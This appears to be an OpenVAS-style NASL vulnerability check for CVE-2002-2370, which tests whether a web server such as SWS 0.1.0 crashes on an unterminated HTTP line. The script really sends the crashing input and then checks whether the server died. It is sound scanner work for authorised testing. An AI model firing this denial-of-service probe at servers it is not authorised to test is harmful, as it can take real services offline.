if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11171" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2002-2370" );
	script_bugtraq_id( 5664 );
	script_name( "HTTP unfinished line denial" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade your web server." );
	script_tag( name: "affected", value: "SWS Web Server v0.1.0 is known to be affected. Other versions or
  products might be affected as well." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "We could crash the remote web server by sending an unfinished line.
  (without a return carriage at the end of the line)." );
	script_tag( name: "impact", value: "An attacker cracker may exploit this flaw to disable this service." );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
vt_strings = get_vt_strings();
send( socket: soc, data: "|" + vt_strings["default"] + "|" );
http_close_socket( soc );
if(http_is_dead( port: port, retry: 3 )){
	security_message( port );
}

